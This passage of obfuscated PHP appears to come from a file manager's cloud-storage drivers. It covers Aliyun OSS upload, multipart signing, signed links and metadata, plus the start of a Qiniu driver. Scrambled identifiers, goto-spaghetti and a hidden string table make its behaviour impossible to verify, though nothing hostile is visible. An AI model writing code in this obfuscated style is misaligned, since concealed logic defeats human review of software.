$this->trafficLimit($ağ˜„ì“İğ[1285]); $A²õÍØ×¦Ü = $this->client->putObject($this->bucket, $this->pathEncode($EêİŞ¾òÄ›), $B†‰ºÑøëö, $bÑ£”Ñ–¿×); } catch (OSS\Core\OssException $eÓ°îå§­Ğ) { return !1; } $a”›¯ğñµ = array($ağ˜„ì“İğ[1274] => trim($A²õÍØ×¦Ü[$ağ˜„ì“İğ[1286]], $ağ˜„ì“İğ[126]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($EêİŞ¾òÄ›))); $this->updateObjMeta($EêİŞ¾òÄ›, $a”›¯ğñµ); return isset($A²õÍØ×¦Ü[$ağ˜„ì“İğ[1287]][$ağ˜„ì“İğ[1233]]) ? !0 : !1; } private function updateObjMeta($cİ‰ïÊõ·, $E÷Ú˜äíÓ) { $cİ‰ïÊõ· = $this->pathEncode($cİ‰ïÊõ·); try { $a‡³§Œ·» = array(OSS\OssClient::OSS_HEADERS => $E÷Ú˜äíÓ); $this->client->copyObject($this->bucket, $cİ‰ïÊõ·, $this->bucket, $cİ‰ïÊõ·, $a‡³§Œ·»); } catch (OSS\Core\OssException $aÎÛÇÎë‚) { return !1; } return !0; } public function upload($cÃ“‡Úàê‹, $DĞè¥Î÷¼’, $AĞ»¡ëÜØ = false, $Aİºğ¦ÛŒ = REPEAT_REPLACE) { $D‡Ù¡‚³¢¾ =& $_SERVER[£¶ä½¶¢]; $E×İ×¡¸– = trim($cÃ“‡Úàê‹, $D‡Ù¡‚³¢¾[18]); $CÜ……ù¸ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($D‡Ù¡‚³¢¾[1274] => @md5_file($DĞè¥Î÷¼’)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($cÃ“‡Úàê‹))); $CÜ……ù¸ = $this->trafficLimit($D‡Ù¡‚³¢¾[1285], $CÜ……ù¸); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($E×İ×¡¸–), $DĞè¥Î÷¼’, $CÜ……ù¸); } catch (OSS\Core\OssException $f²ì¬Ñº„…) { return !1; } return $this->getPathOuter($cÃ“‡Úàê‹); } public function getHost() { $D‰­Œãğ÷ =& $_SERVER[£¶ä½¶¢]; $C•Šª’ªÈ = explode($D‰­Œãğ÷[187], parent::getHost()); return $C•Šª’ªÈ[0] . $D‰­Œãğ÷[187] . $this->bucket . $D‰­Œãğ÷[105] . $C•Šª’ªÈ[1]; } public function uploadFormData($e¥²Ã‡¿»…, $Bòê¾áÅ©Â = 3600) { goto FàçëİÚ†; eğÛöËìŒÚ: $BÂóÚ›ôƒ¯ = $this->pathFather($e¥²Ã‡¿»…); $BŒ³®´èºƒ = array($dİ²Ô‚‚ì­[1188] => $EÁĞÅø¡¬º, $dİ²Ô‚‚ì­[1189] => array(array($dİ²Ô‚‚ì­[1290], 0, $eçö–Ş‹±¤), array($dİ²Ô‚‚ì­[1192], $dİ²Ô‚‚ì­[1193], $BÂóÚ›ôƒ¯))); $f„›†Ç÷™½ = base64_encode(json_encode($BŒ³®´èºƒ)); goto bŠŞ·çÖ‘ó; FàçëİÚ†: $dİ²Ô‚‚ì­ =& $_SERVER[£¶ä½¶¢]; if (!($aÚÖ”»ˆÙ = $this->getHost())) { return !1; } $Cå‘ØŠÏöã = $Bòê¾áÅ©Â; goto BÇİÚÜËĞ’; BÇİÚÜËĞ’: $bÍ§è¢¤‡ = date($dİ²Ô‚‚ì­[1288], time() + $Cå‘ØŠÏöã); $D’Š˜‹à™Ú = new DateTime($bÍ§è¢¤‡); $EÁĞÅø¡¬º = $D’Š˜‹à™Ú->format(DateTime::ISO8601); goto cªâŠ‚«à; Cëà  ¸‡: return $eÙÊäŠóé®; goto bÓ‡‘è‹«; cªâŠ‚«à: $A˜ö¸†Î¥“ = strpos($EÁĞÅø¡¬º, $dİ²Ô‚‚ì­[303]); $EÁĞÅø¡¬º = substr($EÁĞÅø¡¬º, 0, $A˜ö¸†Î¥“) . $dİ²Ô‚‚ì­[1289]; $eçö–Ş‹±¤ = 1048576000 * 5; goto eğÛöËìŒÚ; bŠŞ·çÖ‘ó: $eùğ¥­‚ø = base64_encode(hash_hmac($dİ²Ô‚‚ì­[239], $f„›†Ç÷™½, $this->secret, !0)); $eÙÊäŠóé® = array($dİ²Ô‚‚ì­[1198] => $f„›†Ç÷™½, $dİ²Ô‚‚ì­[1291] => $this->accessKey, $dİ²Ô‚‚ì­[1194] => $dİ²Ô‚‚ì­[1186], $dİ²Ô‚‚ì­[1292] => $eùğ¥­‚ø, $dİ²Ô‚‚ì­[185] => $aÚÖ”»ˆÙ); $eÙÊäŠóé® = $this->trafficLimit($dİ²Ô‚‚ì­[1285], $eÙÊäŠóé®); goto Cëà  ¸‡; bÓ‡‘è‹«: } public function multiUploadFormData($c¤ÊÏ²šË’, $bß“õ„é†µ = 3600) { $FŸëÈöŠÆƒ =& $_SERVER[£¶ä½¶¢]; if (!($c—Ó§ÔÙ“… = $this->getHost())) { return !1; } $d¾æãö˜ÕØ = $this->trafficLimit($FŸëÈöŠÆƒ[1285]); $aÒÑº£Çòˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($c¤ÊÏ²šË’), $d¾æãö˜ÕØ); return array($FŸëÈöŠÆƒ[231] => $aÒÑº£Çòˆ, $FŸëÈöŠÆƒ[185] => $c—Ó§ÔÙ“… . $FŸëÈöŠÆƒ[18] . $this->pathEncode($c¤ÊÏ²šË’), $FŸëÈöŠÆƒ[232] => gmdate($FŸëÈöŠÆƒ[1293]), $FŸëÈöŠÆƒ[103] => $c¤ÊÏ²šË’); } public function multiUploadAuthData($Cãõœ”Ô½, $bœ”ºªÁ‹ = array()) { goto b¯‘‰ÛÔÎ„; FÉ¿­–×¦Ç: $cëÅåˆöª = array($Aø“¼µõ¼[234], $Aø“¼µõ¼[43], $Aø“¼µõ¼[129], $fõ»Š°‘÷, "\x78\x2d\x6f\x73\163\55\144\141\x74\x65\72{$fõ»Š°‘÷}", $Aø“¼µõ¼[18] . $this->bucket . $Aø“¼µõ¼[18] . $B˜³ƒ³òÅ . $f½ˆÏÈÁ“’); if (strpos($f½ˆÏÈÁ“’, $Aø“¼µõ¼[235]) === 0) { $cëÅåˆöª[0] = $Aø“¼µõ¼[236]; if ($BµÊè•ÈÓ¦ = $this->trafficLimit($Aø“¼µõ¼[1285])) { $B˜³ƒ³òÅ = $Aø“¼µõ¼[1294]; array_splice($cëÅåˆöª, 5, 0, $B˜³ƒ³òÅ . $Aø“¼µõ¼[14] . $BµÊè•ÈÓ¦[$B˜³ƒ³òÅ]); } } if (isset($bœ”ºªÁ‹[$Aø“¼µõ¼[237]]) && $bœ”ºªÁ‹[$Aø“¼µõ¼[237]] == $Aø“¼µõ¼[238]) { $cëÅåˆöª[0] = $Aø“¼µõ¼[238]; } goto f‚Ÿ·³Á†; f‚Ÿ·³Á†: if (!empty($bœ”ºªÁ‹[$Aø“¼µõ¼[1295]])) { $CÄçˆ°ÏÓõ = array_merge(array($cëÅåˆöª[4]), $bœ”ºªÁ‹[$Aø“¼µõ¼[1295]]); sort($CÄçˆ°ÏÓõ); $cëÅåˆöª[4] = implode($Aø“¼µõ¼[9], $CÄçˆ°ÏÓõ); } $fÓöõ¢¨‡ = implode($Aø“¼µõ¼[9], $cëÅåˆöª); $dÕÒô…¶½ = base64_encode(hash_hmac($Aø“¼µõ¼[239], $fÓöõ¢¨‡, $this->secret, !0)); goto FÀ‚¢™‚Ÿ; FÀ‚¢™‚Ÿ: $e–ÛÊ±µÙÜ = $Aø“¼µõ¼[1258] . $this->accessKey . $Aø“¼µõ¼[14] . $dÕÒô…¶½; if (strpos($f½ˆÏÈÁ“’, $Aø“¼µõ¼[235]) === 0) { $e–ÛÊ±µÙÜ = array($Aø“¼µõ¼[241] => $e–ÛÊ±µÙÜ, $Aø“¼µõ¼[232] => $fõ»Š°‘÷); if ($BµÊè•ÈÓ¦) { $e–ÛÊ±µÙÜ = array_merge($e–ÛÊ±µÙÜ, $BµÊè•ÈÓ¦); } } return $e–ÛÊ±µÙÜ; goto aÊá¦×ÍËÄ; b¯‘‰ÛÔÎ„: $Aø“¼µõ¼ =& $_SERVER[£¶ä½¶¢]; $fõ»Š°‘÷ = isset($bœ”ºªÁ‹[$Aø“¼µõ¼[232]]) ? $bœ”ºªÁ‹[$Aø“¼µõ¼[232]] : gmdate($Aø“¼µõ¼[1293]); $f½ˆÏÈÁ“’ = isset($bœ”ºªÁ‹[$Aø“¼µõ¼[178]]) ? $bœ”ºªÁ‹[$Aø“¼µõ¼[178]] : $Aø“¼µõ¼[43]; goto d£ì˜¡ê¤; d£ì˜¡ê¤: $B˜³ƒ³òÅ = $Cãõœ”Ô½; if (isset($bœ”ºªÁ‹[$Aø“¼µõ¼[103]])) { $B˜³ƒ³òÅ = $bœ”ºªÁ‹[$Aø“¼µõ¼[103]]; unset($bœ”ºªÁ‹[$Aø“¼µõ¼[103]]); } if (isset($bœ”ºªÁ‹[$Aø“¼µõ¼[233]])) { $bœ”ºªÁ‹[$Aø“¼µõ¼[232]] = $fõ»Š°‘÷; return $this->listUploadParts($B˜³ƒ³òÅ, $bœ”ºªÁ‹); } goto FÉ¿­–×¦Ç; aÊá¦×ÍËÄ: } public function listUploadParts($CÑÌ†¥ç×À, $B®áë½ïŞè) { goto C³ä£ê¡½Ï; C³ä£ê¡½Ï: $Cå¸Å‚ì®¤ =& $_SERVER[£¶ä½¶¢]; $aäÃ×‰èùƒ = parse_url_query($B®áë½ïŞè[$Cå¸Å‚ì®¤[178]]); $C—–ëíôÎÃ = $this->client->listParts($this->bucket, $this->pathEncode($CÑÌ†¥ç×À), $aäÃ×‰èùƒ[$Cå¸Å‚ì®¤[231]]); goto F¿Ää¼Ï¿•; EÓÚ½À¤: unset($B®áë½ïŞè[$Cå¸Å‚ì®¤[233]], $B®áë½ïŞè[$Cå¸Å‚ì®¤[237]]); $Aã°‘¯É = $this->multiUploadAuthData($CÑÌ†¥ç×À, $B®áë½ïŞè); if (empty($Aã°‘¯É)) { return !1; } goto A˜»½âØ‰ç; A˜»½âØ‰ç: return array($Cå¸Å‚ì®¤[241] => $Aã°‘¯É, $Cå¸Å‚ì®¤[232] => $B®áë½ïŞè[$Cå¸Å‚ì®¤[232]], $Cå¸Å‚ì®¤[243] => $e’†È Ÿáä); goto cˆŸò¥«ÒÊ; F¿Ää¼Ï¿•: $eŒ¥Æ¤ßê± = $C—–ëíôÎÃ->getListPart(); $e’†È Ÿáä = array(); foreach ($eŒ¥Æ¤ßê± as $bå¨­õéøò) { $e’†È Ÿáä[] = array($Cå¸Å‚ì®¤[1278] => $bå¨­õéøò->getPartNumber(), $Cå¸Å‚ì®¤[1279] => trim($bå¨­õéøò->getETag(), $Cå¸Å‚ì®¤[126])); } goto EÓÚ½À¤; cˆŸò¥«ÒÊ: } public function download($f­±øñÏÍ¹, $a¢·•áÀ²ô) { if ($this->isFolder($f­±øñÏÍ¹)) { return !1; } try { $a´ÛÀíÚ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $a¢·•áÀ²ô); $a´ÛÀíÚ = $this->trafficLimit($_SERVER[£¶ä½¶¢][119], $a´ÛÀíÚ); $this->client->getObject($this->bucket, $this->pathEncode($f­±øñÏÍ¹), $a´ÛÀíÚ); } catch (OSS\Core\OssException $F‡ÒÜœ÷èŒ) { return !1; } return $a¢·•áÀ²ô; } public function fileSubstr($E‡ìöÍš¡, $CÎòé¾œÆÈ = 0, $B¡éÛ’Æˆ‚ = false) { if ($CÎòé¾œÆÈ === -1) { $B¾†ŠÙÅŒ = array(); } else { if ($B¡éÛ’Æˆ‚ === !1) { $AòŸÈˆ¿¹ë = $this->size($E‡ìöÍš¡); } else { $AòŸÈˆ¿¹ë = $CÎòé¾œÆÈ + $B¡éÛ’Æˆ‚ - 1; } $B¾†ŠÙÅŒ = array(OSS\OssClient::OSS_RANGE => "{$CÎòé¾œÆÈ}\x2d{$AòŸÈˆ¿¹ë}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($E‡ìöÍš¡), $B¾†ŠÙÅŒ); } catch (OSS\Core\OssException $A†ø³„‹) { think_exception($A†ø³„‹->getMessage()); return !1; } } private function trafficLimit($b‰áÌ»Éâ, $f¦ÌŒ‘Ì‘¨ = array()) { goto AĞ§ƒïØ‡; AĞ§ƒïØ‡: $AÇÅÛ”Óµ‹ =& $_SERVER[£¶ä½¶¢]; if ($b‰áÌ»Éâ == $AÇÅÛ”Óµ‹[1285] && $this->isUploadServer() || $b‰áÌ»Éâ == $AÇÅÛ”Óµ‹[119] && $this->isFileOutServer()) { return $f¦ÌŒ‘Ì‘¨; } $E¢ä£†ñ´á = floatval($GLOBALS[$AÇÅÛ”Óµ‹[16]][$AÇÅÛ”Óµ‹[98]][$AÇÅÛ”Óµ‹[117]][$b‰áÌ»Éâ]) * 1024 * 1024 * 8; goto B„¿Ç‚®å¢; a¡æ°áøŠã: return $f¦ÌŒ‘Ì‘¨; goto C„ááÌ÷Ş½; B„¿Ç‚®å¢: if (!$E¢ä£†ñ´á) { return $f¦ÌŒ‘Ì‘¨; } $E¢ä£†ñ´á = $E¢ä£†ñ´á < 819200 ? 819200 : ($E¢ä£†ñ´á > 838860800 ? 838860800 : $E¢ä£†ñ´á); $f¦ÌŒ‘Ì‘¨[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($E¢ä£†ñ´á); goto a¡æ°áøŠã; C„ááÌ÷Ş½: } public function link($f¨½¯†İÈ–, $B¶—²²Üªƒ = array()) { $a„ßÊìƒ¡ô =& $_SERVER[£¶ä½¶¢]; if (!$this->exist($f¨½¯†İÈ–) || $this->isFolder($f¨½¯†İÈ–)) { return !1; } try { $B¶—²²Üªƒ = $this->trafficLimit($a„ßÊìƒ¡ô[119], $B¶—²²Üªƒ); $A…°®‘İø… = $this->client->signUrl($this->bucket, $this->pathEncode($f¨½¯†İÈ–), 3600 * 12, $a„ßÊìƒ¡ô[238], $B¶—²²Üªƒ); return $this->getCdnLink($A…°®‘İø…); } catch (OSS\Core\OssException $C˜´–àğ†¼) { return !1; } } public function fileOut($d¥ª¯´®Ğ¹, $DÚó²´Ó÷ª = false, $D±ó¦›î½ = false, $b¹ô©“Ë—‹ = '') { goto eæ¨Ò¹¬«à; D²•õ§Šà: $D±ó¦›î½ = rawurlencode($D±ó¦›î½); $f“‡¨ÖÎ´‡ = get_file_mime(get_path_ext($D±ó¦›î½)); if ($f“‡¨ÖÎ´‡ == $Bô‡‹¦”Äè[223]) { return parent::fileOut($d¥ª¯´®Ğ¹, $DÚó²´Ó÷ª, $D±ó¦›î½, $b¹ô©“Ë—‹); } goto B™Şƒ—®; C‘’Ü…Éê‘: $CÍÉöã›× = $this->link($d¥ª¯´®Ğ¹, $d²Ø¡Ûº«”); $this->fileOutLink($CÍÉöã›×); goto bÔŸËÁæÚ·; B™Şƒ—®: $DÚó²´Ó÷ª = $DÚó²´Ó÷ª ? $Bô‡‹¦”Äè[224] : $Bô‡‹¦”Äè[225]; $d²Ø¡Ûº«” = array(OSS\OssClient::OSS_SUB_RESOURCE => $Bô‡‹¦”Äè[1296] . rawurlencode("{$DÚó²´Ó÷ª}\73\x66\x69\x6c\145\156\x61\x6d\145\x3d{$D±ó¦›î½}")); $d²Ø¡Ûº«”[OSS\OssClient::OSS_SUB_RESOURCE] .= $Bô‡‹¦”Äè[1297] . rawurlencode($f“‡¨ÖÎ´‡); goto C‘’Ü…Éê‘; eæ¨Ò¹¬«à: $Bô‡‹¦”Äè =& $_SERVER[£¶ä½¶¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($d¥ª¯´®Ğ¹, $DÚó²´Ó÷ª, $D±ó¦›î½, $b¹ô©“Ë—‹); } if (!$D±ó¦›î½) { $D±ó¦›î½ = $this->pathThis($d¥ª¯´®Ğ¹); } goto D²•õ§Šà; bÔŸËÁæÚ·: } public function fileOutServer($F‚çÆà‘²‡, $d‹³–ñÇ°î = false, $FĞÊÇ×Ò” = false, $fµ“„É© = '') { parent::fileOut($F‚çÆà‘²‡, $d‹³–ñÇ°î, $FĞÊÇ×Ò”, $fµ“„É©); } public function fileOutImage($D©¶¢¯ïœŸ, $dŞ²ÑÆŸÒ† = 250) { $bôİÌ¶˜‡ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[£¶ä½¶¢][1298] . $dŞ²ÑÆŸÒ†); $eƒ‡–«òÄ = $this->link($D©¶¢¯ïœŸ, $bôİÌ¶˜‡); $this->fileOutLink($eƒ‡–«òÄ); } public function fileOutImageServer($e˜£˜¶ñšÁ, $e™ÉİÆ«Ù¯ = 250) { parent::fileOutImage($e˜£˜¶ñšÁ, $e™ÉİÆ«Ù¯); } public function fileOutLink($dÃïŠÛŠˆ) { $CÂÍ¬»Í¤ =& $_SERVER[£¶ä½¶¢]; if (!$this->isCdnHost() && substr($dÃïŠÛŠˆ, 0, 7) == $CÂÍ¬»Í¤[1201]) { $dÃïŠÛŠˆ = $CÂÍ¬»Í¤[1202] . substr($dÃïŠÛŠˆ, 7); } header($CÂÍ¬»Í¤[169] . $dÃïŠÛŠˆ); die; } public function hashMd5($C’ÒÊ‹‰¼, $CÉª‹í¦Ê = '') { $B˜Ñ¾¤Ø³ =& $_SERVER[£¶ä½¶¢]; $C¿¿ë–ºë¥ = $this->_objectMeta($C’ÒÊ‹‰¼); if (!$C¿¿ë–ºë¥) { return $B˜Ñ¾¤Ø³[43]; } if (!isset($C¿¿ë–ºë¥[$B˜Ñ¾¤Ø³[1274]]) && !empty($CÉª‹í¦Ê)) { $a˜Ê’éîéí = $this->updateObjMeta($C’ÒÊ‹‰¼, array($B˜Ñ¾¤Ø³[1274] => $CÉª‹í¦Ê)); $C¿¿ë–ºë¥[$B˜Ñ¾¤Ø³[1274]] = $a˜Ê’éîéí ? $CÉª‹í¦Ê : $B˜Ñ¾¤Ø³[43]; } return isset($C¿¿ë–ºë¥[$B˜Ñ¾¤Ø³[1274]]) ? strtolower($C¿¿ë–ºë¥[$B˜Ñ¾¤Ø³[1274]]) : $B˜Ñ¾¤Ø³[43]; } public function size($FÖ±‚Ïˆ²) { $aØäÂ“‡½ = $this->objectMeta($FÖ±‚Ïˆ²); return $aØäÂ“‡½ ? $aØäÂ“‡½[$_SERVER[£¶ä½¶¢][88]] : 0; } public function info($eñ“ßîã³è) { if ($this->isFolder($eñ“ßîã³è)) { return $this->folderInfo($eñ“ßîã³è); } else { if ($this->isFile($eñ“ßîã³è)) { return $this->fileInfo($eñ“ßîã³è); } } return !1; } public function exist($Bøîåóéñß) { return $this->isFile($Bøîåóéñß) || $this->isFolder($Bøîåóéñß); } public function isFile($eâõ©‘ø¶™) { return !$this->isFolder($eâõ©‘ø¶™) && $this->objectMeta($eâõ©‘ø¶™); } public function isFolder($F¢ê„Í¦Ğõ) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][209], $F¢ê„Í¦Ğõ); } protected function objectMeta($C…¬Î¾¾ˆŒ) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][210], $C…¬Î¾¾ˆŒ); } protected function _objectMeta($cÃËÉŒ‚ª‚) { $bØ¾‰º™Î =& $_SERVER[£¶ä½¶¢]; try { $c™Ô«è˜ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($cÃËÉŒ‚ª‚)); } catch (OSS\Core\OssException $eÈíõ ‹÷Ê) { $c™Ô«è˜ = !1; } if ($c™Ô«è˜) { $c™Ô«è˜[$bØ¾‰º™Î[88]] = intval($c™Ô«è˜[$bØ¾‰º™Î[1272]]); } return $c™Ô«è˜; } protected function _isFolder($EÎÎ«¨ÜÇ) { $e†Ş§–†¶Ø =& $_SERVER[£¶ä½¶¢]; if ($EÎÎ«¨ÜÇ == $e†Ş§–†¶Ø[43] || $EÎÎ«¨ÜÇ == $e†Ş§–†¶Ø[18]) { return !0; } $b¾âĞÈ×ÎÆ = array($e†Ş§–†¶Ø[1268] => $e†Ş§–†¶Ø[18], $e†Ş§–†¶Ø[1269] => rtrim($EÎÎ«¨ÜÇ, $e†Ş§–†¶Ø[18]) . $e†Ş§–†¶Ø[18], $e†Ş§–†¶Ø[1270] => 1, $e†Ş§–†¶Ø[1271] => $e†Ş§–†¶Ø[43]); $DÓ©×Œåô† = $this->client->listObjects($this->bucket, $b¾âĞÈ×ÎÆ); if ($DÓ©×Œåô†->getObjectList() || $DÓ©×Œåô†->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($D™ˆ‰“) { parent::__construct(); require_once SDK_DIR . $_SERVER[£¶ä½¶¢][1299]; $this->_init($D™ˆ‰“); } public function _init($A¾Ç³Ä»Çé) { goto EìååœÂ„å; EìååœÂ„å: $d¢ùÕÏØÑä =& $_SERVER[£¶ä½¶¢]; foreach ($A¾Ç³Ä»Çé as $d×Öá°£‘¼ => $E«Ó–¿“ë ) { if (isset($this->{$d×Öá°£‘¼})) { $this->{$d×Öá°£‘¼} = $E«Ó–¿“ë ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($d¢ùÕÏØÑä[1300] . LNG($d¢ùÕÏØÑä[1259])); } goto cĞÏ…åß…ª; b´ˆ•Ò„—É: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto C³²ºãì”Ä; cĞÏ…åß…ª: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto b´ˆ•Ò„—É; C³²ºãì”Ä: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($B«Ó”‹Êª¥, $dÂ ãÊëÑ = '', $A•¸ªğ…Åœ = REPEAT_RENAME) { if ($this->setContent($B«Ó”‹Êª¥, $dÂ ãÊëÑ)) { return $this->getPathOuter($B«Ó”‹Êª¥); } return !1; } public function mkdir($fÄò©ğ´çÚ, $A‰•±óã¬ = REPEAT_SKIP) { goto Eœìê…ë™; Fàª…²À™é: if (!$this->mkfile($E®ôÑøªó)) { return !1; } if (!$this->moveFile($E®ôÑøªó, $fÄò©ğ´çÚ)) { $this->delFile($E®ôÑøªó); return !1; } return $this->getPathOuter($f‘®Ï®™·°); goto a‘¹õš¶Ã¤; Eœìê…ë™: $EÃçŠ¼§ =& $_SERVER[£¶ä½¶¢]; $f‘®Ï®™·° = trim($fÄò©ğ´çÚ, $EÃçŠ¼§[18]); if ($this->_isFolder($f‘®Ï®™·°)) { return $this->getPathOuter($f‘®Ï®™·°); } goto B†èœÀçîÂ; B†èœÀçîÂ: $fÄò©ğ´çÚ = $f‘®Ï®™·° . $EÃçŠ¼§[18]; $eˆÔªïÖê† = get_path_this($f‘®Ï®™·°); $E®ôÑøªó = $fÄò©ğ´çÚ . $eˆÔªïÖê†; goto Fàª…²À™é; a‘¹õš¶Ã¤: } public function copyFile($D——ç¬ˆ¾, $c½„ÆÓ–Œ) { $f‚…¤¢è = $this->bucketManager->copy($this->bucket, $D——ç¬ˆ¾, $this->bucket, $c½„ÆÓ–Œ, !0); return $f‚…¤¢è ? !1 : $this->getPathOuter($c½„ÆÓ–Œ); } public function moveFile($fíëÁ¡î—Ö, $a…šª²½Š„) { $b¼ï“Ì›¹Ş = $this->bucketManager->move($this->bucket, $fíëÁ¡î—Ö, $this->bucket, $a…šª²½Š„, !0); return $b¼ï“Ì›¹Ş ? !1 : $this->getPathOuter($a…šª²½Š„); } public function delFile($C‚ß£íÎÌ„) { if (!$this->exist($C‚ß£íÎÌ„)) { return !0; } $Aß·¥ñØ™ = $this->bucketManager->delete($this->bucket, $C‚ß£íÎÌ„); return $Aß·¥ñØ™ ? !1 : !0; } public function delFolder($DÜ›‰¦š†) { goto dÇçÙ”ÛÆÎ; aø‰±Ç„‡: if (!empty($DÜ›‰¦š†) && $DÜ›‰¦š† !== $a‘Œ†¦Î£[201] && !in_array($aÛ‡ì‹ƒ©, $C¦¨ÆÇÅ¨©[$a‘Œ†¦Î£[85]])) { $C¦¨ÆÇÅ¨©[$a‘Œ†¦Î£[85]][] = $aÛ‡ì‹ƒ©; } $f×ƒ‰Ö¿¡Á = $this->delByBatch($C¦¨ÆÇÅ¨©[$a‘Œ†¦Î£[84]]); if (!$f×ƒ‰Ö¿¡Á) { return !1; } goto e¾º¿ÂÒĞ; dÇçÙ”ÛÆÎ: $a‘Œ†¦Î£ =& $_SERVER[£¶ä½¶¢]; if (!$this->exist($DÜ›‰¦š†)) { return !0; } $this->listItemCache = !1; goto aĞÚØÙˆ±÷; aĞÚØÙˆ±÷: $C¦¨ÆÇÅ¨© = $this->fileList($DÜ›‰¦š†); $this->listItemCache = !0; $aÛ‡ì‹ƒ© = trim($DÜ›‰¦š†, $a‘Œ†¦Î£[18]) . $a‘Œ†¦Î£[18]; goto aø‰±Ç„‡; e¾º¿ÂÒĞ: $f×ƒ‰Ö¿¡Á = $this->delByBatch($C¦¨ÆÇÅ¨©[$a‘Œ†¦Î£[85]]); if (!$f×ƒ‰Ö¿¡Á) { return !1; } return $this->delFile($aÛ‡ì‹ƒ©); goto cŠˆ˜–Ùé; cŠˆ˜–Ùé: } private function delByBatch($bø¬ÓƒèË¶) { foreach (array_chunk($bø¬ÓƒèË¶, 1000) as $aÜˆïÅœå×) { $B‰Ê÷àÇä‰ = $this->bucketManager->buildBatchDelete($this->bucket, $aÜˆïÅœå×); list($AíöâŸ‰, $fç¾Ö¬äÚ) = $this->bucketManager->batch($B‰Ê÷àÇä‰); if ($fç¾Ö¬äÚ) { return !1; } } return !0; } public function rename($BÀËº—ëº‰, $A­ÛãÏé´Å) { return $this->renameObject($BÀËº—ëº‰, $A­ÛãÏé´Å); } public function fileInfo($e´¥¼ËÊ, $C³‘ĞóƒÉ = false, $dˆ÷òÓ”¦ = array()) { goto a¾Å‚ÎÊªŠ; a¾Å‚ÎÊªŠ: $Fò’İ¼µ‡ø =& $_SERVER[£¶ä½¶¢]; $D…¸¢‡Êï = array($Fò’İ¼µ‡ø[38] => $this->pathThis($e´¥¼ËÊ), $Fò’İ¼µ‡ø[86] => $this->getPathOuter($Fò’İ¼µ‡ø[18] . $e´¥¼ËÊ), $Fò’İ¼µ‡ø[39] => $Fò’İ¼µ‡ø[203], $Fò’İ¼µ‡ø[88] => isset($dˆ÷òÓ”¦[$Fò’İ¼µ‡ø[1301]]) ? $dˆ÷òÓ”¦[$Fò’İ¼µ‡ø[1301]] : 0, $Fò’İ¼µ‡ø[178] => $this->ext($e´¥¼ËÊ)); if ($C³‘ĞóƒÉ) { return $D…¸¢‡Êï; } goto CğÔğ¥ğ§ã; CğÔğ¥ğ§ã: $D…¸¢‡Êï[$Fò’İ¼µ‡ø[204]] = $D…¸¢‡Êï[$Fò’İ¼µ‡ø[94]] = 0; $D…¸¢‡Êï[$Fò’İ¼µ‡ø[205]] = $D…¸¢‡Êï[$Fò’İ¼µ‡ø[206]] = !0; if (empty($dˆ÷òÓ”¦)) { $dˆ÷òÓ”¦ = $this->objectMeta($e´¥¼ËÊ); if (!$dˆ÷òÓ”¦) { return $D…¸¢‡Êï; } } goto bÈ‚›àÛù; bÈ‚›àÛù: if (isset($dˆ÷òÓ”¦[$Fò’İ¼µ‡ø[1302]])) { $D…¸¢‡Êï[$Fò’İ¼µ‡ø[94]] = substr($dˆ÷òÓ”¦[$Fò’İ¼µ‡ø[1302]] . $Fò’İ¼µ‡ø[43], 0, 10); } if (isset($dˆ÷òÓ”¦[$Fò’İ¼µ‡ø[1301]])) { $D…¸¢‡Êï[$Fò’İ¼µ‡ø[88]] = $dˆ÷òÓ”¦[$Fò’İ¼µ‡ø[1301]]; } return $D…¸¢‡Êï; goto D¼¬†ñÆµ‹; D¼¬†ñÆµ‹: } public function folderInfo($dáî§Õ©‡Œ, $Eù“²ïĞ = false) { goto DÎ‰¢ø…ˆÄ; DÎ‰¢ø…ˆÄ: $A¸™×ïÜ¸¹ =& $_SERVER[£¶ä½¶¢]; $Bòİ‹ ®ÕŒ = array($A¸™×ïÜ¸¹[38] => $this->pathThis($dáî§Õ©‡Œ), $A¸™×ïÜ¸¹[86] => $this->getPathOuter($A¸™×ïÜ¸¹[18] . $dáî§Õ©‡Œ), $A¸™×ïÜ¸¹[39] => $A¸™×ïÜ¸¹[87]); if ($Eù“²ïĞ) { return $Bòİ‹ ®ÕŒ; } goto e…ê…ÌÊ•¦; e…ê…ÌÊ•¦: $Bòİ‹ ®ÕŒ[$A¸™×ïÜ¸¹[204]] = $Bòİ‹ ®ÕŒ[$A¸™×ïÜ¸¹[94]] = 0; $Bòİ‹ ®ÕŒ[$A¸™×ïÜ¸¹[205]] = $Bòİ‹ ®ÕŒ[$A¸™×ïÜ¸¹[206]] = !0; $dáî§Õ©‡Œ = rtrim($dáî§Õ©‡Œ, $A¸™×ïÜ¸¹[18]) . $A¸™×ïÜ¸¹[18]; goto e•Ñã …Á; e•Ñã …Á: $Eª°Š„–Äœ = $this->objectMeta($dáî§Õ©‡Œ); if (isset($Eª°Š„–Äœ[$A¸™×ïÜ¸¹[1302]])) { $Bòİ‹ ®ÕŒ[$A¸™×ïÜ¸¹[94]] = substr($Eª°Š„–Äœ[$A¸™×ïÜ¸¹[1302]] . $A¸™×ïÜ¸¹[43], 0, 10); } return $Bòİ‹ ®ÕŒ; goto Fó“‚ª·Íâ; Fó“‚ª·Íâ: } public function 